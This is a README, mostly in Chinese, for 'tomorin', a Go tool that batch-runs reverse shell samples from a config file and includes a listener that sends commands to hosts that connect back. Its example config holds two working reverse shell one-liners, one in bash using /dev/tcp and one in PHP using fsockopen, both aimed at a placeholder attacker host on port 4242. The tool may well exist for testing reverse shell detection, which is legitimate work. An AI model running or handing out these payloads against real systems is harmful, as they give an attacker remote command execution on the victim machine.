# tomorin 批量执行反弹 Shell 样本

## Build

```bash
go build -o ./bin/tomorin
```

### attacker

```
ubuntu@VM-0-5-ubuntu:~/source/tomorin$ ./bin/tomorin serve -h
Run reverse shell server

Usage:
  tomorin serve [flags]

Flags:
  -a, --address strings   Addresses to listen, each of which has the format of [PROTO:[IP:]]PORT. If PROTO is not specified, then "tcp" will be used. If IP is not specified, then "udp" will be used.
      --cmd string        Command to be executed once a remove host is connected (default "whoami && sleep 2")
      --cmd-exit          Whether to append an "exit" to the end of the provided cmd. This should always be true if you want a graceful exit on the remote shell. (default true)
  -h, --help              help for serve
      --tcp-timeout int   Timeout for each connection. Applied to TCP only (default 10)
```

监听 TCP 29007 和 UDP 29008 端口。当victim连接上端口的时候，发送指定的cmd然后退出。

```bash
./bin/tomorin serve -a tcp:29007 -a udp:29008
```

### victim

```
ubuntu@VM-0-5-ubuntu:~/source/tomorin$ ./bin/tomorin run -h
Run reverse shell samples from current host

Usage:
  tomorin run [flags]

Flags:
  -c, --config string   Path to the config file (default "config.yml")
  -h, --help            help for run
      --timeout int     Timeout of each sample (default 10)
      --wait int        Timeout until the next sample (default 7)
```

编写 `config.yml`，把反弹Shell样本写入 `samples` 字段，把依赖项写入 `depends` 字段，比如

```yaml
depends:
- php
samples:
- name: 001
  script: bash -i >& /dev/tcp/attacker.ip/4242 0>&1
- name: 002
  script: php -r '$sock=fsockopen("attacker.ip",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
```

确认所有依赖都无误之后，执行所有反弹Shell样本

```bash
./bin/tomorin run -c config.yml
```

## TODO

- [ x ] Reverse shell server
    - [ x ] TCP
    - [ x ] UDP
